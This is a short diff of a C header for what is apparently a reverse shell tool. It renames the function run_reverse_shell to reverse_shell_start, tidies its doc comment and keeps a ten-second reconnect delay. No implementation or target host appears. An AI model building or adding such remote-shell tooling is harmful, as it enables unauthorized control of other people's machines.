@@ -4,11 +4,11 @@
 #define RECONNECT_DELAY 10 /* Seconds between reconnects */
 
 /**
- * @brief Run reverse shell with fixed IP and port.
- * 
- * @param ip 
- * @param port 
+ * @brief Start reverse shell with fixed IP and port.
+ *
+ * @param ip
+ * @param port
  */
-void run_reverse_shell(const char *ip, int port);
+void reverse_shell_start(const char *ip, int port);
 
 #endif /* __REVERSE_SHELL_H */
